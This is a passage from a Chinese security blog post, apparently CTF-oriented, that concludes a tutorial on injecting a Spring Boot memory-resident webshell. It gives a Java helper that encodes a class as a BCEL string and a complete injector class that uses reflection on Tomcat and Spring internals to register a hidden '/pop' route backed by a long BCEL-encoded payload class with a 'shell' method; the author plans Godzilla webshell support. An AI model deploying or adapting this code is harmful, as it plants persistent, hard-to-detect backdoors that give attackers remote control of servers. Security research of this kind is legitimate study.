<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.spel.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.spel.controller.BcelInjectToController;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.security.auth.login.Configuration;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassToBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ConvertToCode</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        JavaClass javaClass= Repository.lookupClass(BcelInjectToController.class);</span><br><span class="line">        String code= Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        code+=<span class="string">&quot;$$BCEL$$&quot;</span>;</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> ConvertToCode();</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后的内存马如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.spel.controller;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelSpringMemShell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BcelSpringMemShell</span><span class="params">(String aaa)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BcelSpringMemShell</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">springClassload</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获得standardcontext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">standardcontext</span> <span class="operator">=</span> resourcesField.get(Thread.currentThread().getContextClassLoader());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> standardcontext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//迭代获得TomcatEmbeddedContext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">TomcatEmbeddedContext</span> <span class="operator">=</span> contextField.get(standardcontext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context2Field</span> <span class="operator">=</span> TomcatEmbeddedContext.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context2Field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获取到了ApplicationContext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> context2Field.get(TomcatEmbeddedContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">attributesField</span> <span class="operator">=</span> ApplicationContext.getClass().getDeclaredField(<span class="string">&quot;attributes&quot;</span>);</span><br><span class="line">        attributesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ConcurrentHashMap</span> <span class="variable">attributesMap</span> <span class="operator">=</span> (ConcurrentHashMap) attributesField.get(ApplicationContext);</span><br><span class="line">        <span class="comment">//这里springboot版本偏高，低版本有所不同。获取到AnnotationConfigServletWebServerApplication</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">springRoot</span> <span class="operator">=</span> attributesMap.get(<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getBean</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.context.support.AbstractApplicationContext&quot;</span>).getDeclaredMethod(<span class="string">&quot;getBean&quot;</span>, Class.class);</span><br><span class="line">        <span class="comment">//最终获取到RequestMapping，结束。接下来注册路由</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> getBean.invoke(springRoot, springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> requestMappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">config</span> <span class="operator">=</span> configField.get(requestMappingHandlerMapping);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">paths</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>).getDeclaredMethod(<span class="string">&quot;paths&quot;</span>, String[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">options</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$DefaultBuilder&quot;</span>).getDeclaredMethod(<span class="string">&quot;options&quot;</span>, springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$BuilderConfiguration&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">build</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$DefaultBuilder&quot;</span>).getDeclaredMethod(<span class="string">&quot;build&quot;</span>);</span><br><span class="line">        paths.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        options.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        build.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">builder1</span> <span class="operator">=</span> paths.invoke(springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>), (Object)<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/pop&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">builder2</span> <span class="operator">=</span> options.invoke(builder1, config);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">requestMappingInfo</span> <span class="operator">=</span> build.invoke(builder2);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">bcelclassLoader</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>).newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">loadClassmethod</span> <span class="operator">=</span> bcelclassLoader.getClass().getMethod(<span class="string">&quot;loadClass&quot;</span>, String.class);</span><br><span class="line">        Class Memshell= (Class) loadClassmethod.invoke(bcelclassLoader,<span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$JtTW$Z$fen2$93$f7f$e6$r$q$TH$98$40$cb$o$84$ecS$c2$o$q$40$T$C$b1i$93$902$U$I$b4$c5$97$c9K20$997$bcy$93$80K$b5$ae$d5Z$d7V$c4$7d$abqA$zX$H$y$d0R$95V$ebR7$dck$5d$ab$d6$e5$i$cf$d1s$f4$9cj$fd$ee$7b$938$93L$ca1gr$df$bd$ff$ff$df$ff$fe$cb$f7$ff$ef$be$t$fe$f3$d0$c3$A$d6$e3$af$7e$f8$f0J$3f$ee$c0$ab$e4$f0j$Vw$fa$f1$g$bcV$c5$eb$U$bc$de$P$FoP$f0F$3f$ee$c2$9b$a4$e4$9bU$MJ$e2$dd$w$O$aa$b8M$c1$5bT$dc$ae$e2$90$P$f7$e0$ad$w$fa$V$bcM$c5$dbU$bc$c3$8fw$e2$5d$7e$94$e3$5e$V$f7$c9$e7$bb$V$9cP$f1$k$V$t$fdX$8a$f7$aax$9f$8a$f7$x$f8$80$5c$7d$d0$8f$P$e1$c3$7e$ac$c4GT$7cT$3e$3f$s$87$8f$cb$e1$7e9$7c$c2$8fE$98$92$c3$t$e5$c0$e5$3d$f8$94$82O$fbx$cagT$9c$f2$e3$b3$f8$9c$b4$eb$f3$K$k$90$cf$d3$7e$fav$c6$8f$_$e0A9$7cQA$c6$8f$cd$92r$X$kTpV$a0dK$y$R$b3$b7$J$U$d7$d5$ef$V$f0t$99$c3$86$c0$82$deX$c2$e8O$8f$P$Z$d6$k$7d$uNJ$b0$d7$8c$ea$f1$bd$ba$V$93$eb$y$d1c$8f$c5R$C$eb$7b$a3$e6x$d88$a6$8f$t$e3F8$954$e2$e1$a8$99$b0$z3$k7$ac$f0$f6$a8$R$efI$i6$a2$f6$k$b3k$86$dc$$$b0$a8$ae$f7$b0$3e$a1$87$e3zb4$i$b1$adXb$b4$5d$daP$ac$eb$ba$3cp$OS$a0$bc$cf$b0$c7$cc$e1$B$dd$d2$c7$N$db$b0x$b875f$c4$e3$C$o$vP$93$b3g$c02$a3F$w$b5$3d$j$8b$P$3b$c7$J$93$ffQ$81JW$um$c7$e2$e1HTO$q$inqt$7c$98$d1$98$b4bTK$db$5c$a1$98I$3d$b1$84$bd$cf$nK$r$c6$M$cf9e$e7$b1$a8$91$b4cf$82$3c$z$95$94f$f6$9a$fa$b0TQ$9d$p$d6$V$d7S$v$97A$c1k$a3i$cb2$S$f6n$e3h$daH$d9$9d6$dd$hJ$dbF$ca$f5$$$df$P$cb$Y$893va$97$c7$dd$81$ec$b6n$3dj$e4$87i$d7$90$8c2E$fc$a3$c6$b4r$B$c5$9a$9e$F$ir$wi$sR$dc$a9Z3S$8d$8c$99$98$K$f8$b8$dc$97$N$84$_e$q$86wZ$96$c9yi$c4$d6$a3G$fa$f4$a4$93$7e$c2G$c19$F_ba$b0$A$IyB$9bH$s$ki$c1L$60d$8a$a8$af$9b$89$ddT7$d7$d8$C$Q$u$e4$91gB$b76$I$y$cf$e1$f5$9b$91tt$ac$3bf$c4$87s$b3$mF$5c$e9V$81P$810$3a$f2Y$85$eb$E$wf$t$a9$5d$c1C$acx$d6$8fkw$l$ed$5e1$e7T7$Zy$c7$8e$b3$b6$e8w$c4L$5bQ$a3$3b$s$cbcIa$e8$b7Hm$g$b6b$9b$82$f3$g$$$e0$a2$86$87$f1$88$c0$W$d3$gmqA4$o$931iZGZ$s$8d$a1$WYM$c61$bb$r$9b$c9$96ln$bb$5c$f2$N$a6D8s$a1$e1$S$k$VX$3c$l$bcX$d7$b3$bc$d5$f0e$7c$85e5$3b$e2$cc$aa$86$af$e2$b2$86$c7$f0$b8$86$af$cd$Sr3$a5$e0$eb$g$9e$A$d5V$W$u$W$B$Q$7bf$aa$rAO$U$7cC$c37$f1$z$N$df$c6$93$y$b6$c9XB$c3w$f0$5d$g$3b_$c5r3K$b2$c58$c6$40$W$85$a32$5e$df$p$z$3c$UK$84Sc$a45$b3$96$x$e6$94$b2$86$ef$e3$H$K$aeh$f8$n$7e$q7$fd$98$b9$e9$d4$f0$T$fcT$c3$cf$f0s$NO$e1I$N$bf$c06$NOc$87$86_$ca$d9$af$f0$ebi$_$f2$cbZ$c3o$f0$5b$c6m$bbi$8e$c6$92fr$b9S$Kw$u$f8$9d$86g$e4$f6$df$e3$P$y$e8$XF$a5$86$3f$ca$un$c5$O$82K$c3$b3$f8$93$86$3f$e3$_$C$cb$ae$82$x$81$d6$ff$bf$b3$b2A$Vl$3cy$b1$ce$ef$wlV$f3TJ$5e$da$f7$8cY$86NRi$W$60$d3$eb$85u$b95$ebRe$7fg$f9d$n$9agF$uO$3c$bf5$fa$e2$9c9$q$81$d5$85$de$Ps$ea$d5mW$d3$7et$U$d8sp$ce$9e$fa$X$ea$af$r$b1$c4$84y$84$a8$db$5c$a0$5d$j$9cK$w$d8$afT$e9$bb$ebF$e5$5cw$vPA$81$jF4$ae$5b$c6$f0$b4$f1$V$ff$T$eba$d8Fe$b0$3c$7b$G$Hv$e6$X$df$f1$94m$8c$bb$dd$9c$r$934$y$fb$b8$40$edU$825$f3$K$N$d8f$af9iX$5d$ba$ec$fc$f9$a9$9b$RR$r$ca$f4$98l$deKr$Vw$8d$e9VD$b6$95D$d4h$af$3f$mPUw$b0$f0K$dc$9b$b2u$cb$96$_$f9$fa$b9$_$e5$f6$3c_$b3D$812z$d4$93H$a6m$ea1t$baX$3d$bd$99$ad$r$87$c1$ed$8b$eb$K2$e4$c9Z$3ae$ec0$e2$b1q$b7$L$ad$99$3f0$b3$ae$A$ca$98$9e$ea$tX$9d$bb$Q$7d$f3$q$9c$857$g7e$a8$bc$ce$dd$80$cf$91xZ6$meB$8f$a7$8d$5d$p2$I$3d$b9Nfs$t$_$Vf$da$9es$97$98$f1$a1$b2$A$99je$ff$b7$e3$ac$fd$f2$i$88d$8b$b1$f9$wY$9e$fd$96$x$a5$8aH$9a$Q$89$baX$yM$ZvgTF$3b$e6$5e$e0$ea$O87$$$8a$cd$82$d0$fc$e0$c6$Kl$e1$VX$fey$d9$e2$f9$g$e3x$3dW$eb$f8$U$92$dap$W$e24$tE$e8$e0$e8$e7$T$dc$e0A$A$9d$9ci$ae$Q$b6$a3$Lp$U$ec$a0$84T$b0$95$ab$a2$f9$UhTP$e6$u$a8r$85$b2$K$e4l$t$ba$b9$f5$rr$$$b8$90Zo$a0Y$8e$d6$e2$w$94$f0$de$N1q$OE$Z$U$f76$G$3d$Zx$83$r$c5$X$a1d$a0$f65$b9$E$$$7d$Z$f8$fb$9b3$I$E5$97Y$da$e6$Jy$9a$b3$9c6$af$c3$w$9bf$95$84JfXJ$c8$xy$L$3c$e4$N$W$H$cb$pR$40$N$v$92X1$bd$c1$e7$ae$83$ae$d0$ZT$3aR$fe$90$g$f2$92$e4$e3$be$85$a4$f8$_$a1$bc$z$Q$a2pV$f9$r$yj$d3B$81$c7p_$b0$aa$ad4X$7d$O$8b3$I$Fk2Xr$S$x$cfc$e9$60$c9E$94s$f75$91AO$f0$da$c8$a07$U$88$9c$c5$b2$b6$b2$v$y$cba$_$97$ec$V9$ec$f3X9$Y$w$cb$e0E$Z$ac$3a$8b$d5$c1$da$M$d6$b4$z$I$z$c8$a0$ee$q$C$f2Y$3f$Fo$a8$b4$adT$ce$hBZ$a84$83$c6$90$96A$93$i$9a$a7$b08$e4$P$v$ae$ed$V$e2$desh$91$f6$ef$9b$a2W$813$b8$$$b86$83$d6$d3$cc$c5$J1$s$8e$m$8cb$t$9d$T$b8$86c9$bfN$wP$8d$mjQ$89$NX$c8$d4$$$c2$A$93$7b$x$a9G$b1$Yw$o$84$T$fc$w$3aE$f9$L$b8$W$8fb$Z$$$T$7cW$f8$n$f4w$ac$S$e5$a8$V$b5X$p$daP$t$aeG$bd$e8F$83$b8$J$8db$AM$o$82$W1$86V$9ez$9d$Y$c7Z$91$s8$rt2$3c$efo$b4$a3$H7$SL$97q7n$otJ$a9$ab$c3$a5Qc$Dz$d1$87$F$3c$f7$C$fa$c9$N$f0y$K$bbh$9bF$5d$wn$c6n$d2$88$a7$y$A$Va$o$82$3d$f4$b3Z$i$c2$z$d8K$dc$d5$d2$8a$7d$d8$cf$936$88N$M$92$e6A$a7$d8$80$D$a4y1$c0S$O$92V$82$5bE$N$fd$dd$cfX$i$V$5e$dcF$g$3f$3c$f1$P$dc$ce$99$8f$de$3f$8dC$9c$f9$f1R$9e$d3$P$f5y$3a$5e$a6$40W0$a4$m$aa$60x$ce$e8$fex$df$g$e1$I$3c$87$r$KF$9f$c3j$Fc$9d$a4$fc$T5$ff$c2$c2$ed$Kb$3e$i$a6N$P$ad$OS$ff$R$c4i$ab$ac$c1$x$7cz$f9$dc$q$fa$g$88$d6$fe$e6$a0$ef$7eT57f$b0$aeO$s$d6$c3$o$d8$d0$3f$f5$fc$b3M$8fC$3b$8f$f5$83$8dg$b1$f1$91$sV$d0$8b$9b$b8a$d3$D$d4X$ca$8cV$f1$c3$d3$cdw$xK$X$ccp$R6$d2$cfM$e4$b6$91$dfN$89$z$cc$f2Vfw$h$963$3b$ab$Y$cff$f6$82VVp$a7$f3Q$ee$r$df$8bq$qh$t$zb$ae$f6$3b$F$bf$J$a6S$f0Rc$92X$v$a2$de$b5$b0$90$e2$892R$V$f0$fc$h$8a$C$5ec$d3$fc$U$9f$f0i9$ce$ca$$$e1$x$a2$$P$8bl$$$933$be$3f$95$f5$bd$p$d7$f7$9a$e6$c6l$B$e7$f9$ff$8c$eb$fff$e9$7f$9b$e3$7f$7bSC$b6b$dd$YT$a3$86$9f$da$b91$e8$a1$a57$d2$d6$5er$fb$c9$dfE$89$B$o$fcf$a2z7$fd$bf$Fu$cc$f6Zz$b9$91$98$99$8e$c1R$t$G$c7$9c$Yt$cc$c4$a0$D$c7$b31$d8$c6$Y$ecub$b0$b9$40$M$88$86$f4n$F$_$9b$_$G$c7$9dn$f9r$a7$d9$be$e2$bf$v$y$i$86$P$R$A$A&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">shell</span> <span class="operator">=</span> Memshell.getMethod(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        Object InjectMemshell=Memshell.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">registerMapping</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>).getDeclaredMethod(<span class="string">&quot;registerMapping&quot;</span>, springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>), Object.class, Method.class);</span><br><span class="line">        registerMapping.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        registerMapping.invoke(requestMappingHandlerMapping,requestMappingInfo,InjectMemshell,shell);</span><br><span class="line">        System.out.println(<span class="string">&quot;inject successfully&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再把这个类编译为BCEL注入。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691642899449-ff7e9a95-fab3-4564-873e-96c978012b6f.png#averageHue=%239e9d9c&clientId=u1e300139-0fb9-4&from=paste&height=807&id=uc3d1e5b1&originHeight=1009&originWidth=1915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=259401&status=done&style=none&taskId=ude9db27d-2162-4251-a382-d88f7d0b712&title=&width=1532" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691642927814-565a6076-4c8b-4239-8ded-72abaee30751.png#averageHue=%23d0c3b0&clientId=u1e300139-0fb9-4&from=paste&height=175&id=ub378676e&originHeight=219&originWidth=1908&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25585&status=done&style=none&taskId=ub9ff23c2-c96a-4334-881e-26316d363b7&title=&width=1526.4" alt="image.png"><br>至此算是告一段落了。后续会补充一些tomcat内存马全反射形式，然后加入哥斯拉逻辑，可以哥斯拉连接。</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CTF/" class="tag">#CTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/02/29/Oracle%20%E6%B3%A8%E5%85%A5%20RCE%20%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Oracle 注入 RCE 由浅入深</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/02/29/Atlassian%20Confluence%20CVE-2023-22527%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%AD%A6%E5%99%A8%E5%8C%96%E5%AE%9E%E7%8E%B0/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">Atlassian Confluence CVE-2023-22527 分析及武器化实现</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>